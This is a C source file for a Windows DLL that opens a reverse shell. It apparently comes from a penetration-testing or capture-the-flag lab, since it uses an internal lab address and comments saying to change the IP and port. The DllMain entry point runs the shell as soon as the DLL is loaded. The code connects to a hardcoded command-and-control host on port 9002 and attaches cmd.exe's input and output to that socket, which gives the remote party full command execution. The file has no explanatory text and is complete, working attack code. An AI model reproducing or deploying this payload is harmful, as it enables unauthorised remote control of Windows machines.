#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024
void revShell();
BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpReserved)
{
switch(dwReason)
{
case DLL_PROCESS_ATTACH:
revShell();
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return 0;
}
void revShell() {
Sleep(1000); // 1000 = One Second
SOCKET mySocket;
sockaddr_in addr;
WSADATA version;
WSAStartup(MAKEWORD(2,2), &version);
mySocket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned
int)NULL, (unsigned int)NULL);
addr.sin_family = AF_INET;
addr.sin_addr.s_addr = inet_addr("10.10.14.84"); // Change IP
addr.sin_port = htons(9002); //Change port
//Connecting to Proxy/ProxyIP/C2Host
if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL,
NULL, NULL)==SOCKET_ERROR) {
closesocket(mySocket);
WSACleanup();
}
else {
char RecvData[DEFAULT_BUFLEN];
memset(RecvData, 0, sizeof(RecvData));
int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
if (RecvCode <= 0) {
closesocket(mySocket);
WSACleanup();
}
else {
char Process[] = "cmd.exe";
STARTUPINFO sinfo;
PROCESS_INFORMATION pinfo;
memset(&sinfo, 0, sizeof(sinfo));
sinfo.cb = sizeof(sinfo);
sinfo.dwFlags = (STARTF_USESTDHANDLES |
STARTF_USESHOWWINDOW);
sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError =
(HANDLE) mySocket;
CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL,
NULL, &sinfo, &pinfo);
WaitForSingleObject(pinfo.hProcess, INFINITE);
CloseHandle(pinfo.hProcess);
CloseHandle(pinfo.hThread);
memset(RecvData, 0, sizeof(RecvData));
int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN,
0);
if (RecvCode <= 0) {
closesocket(mySocket);
WSACleanup();
}
if (strcmp(RecvData, "exit\n") == 0) {
exit(0);
}
}
}
}
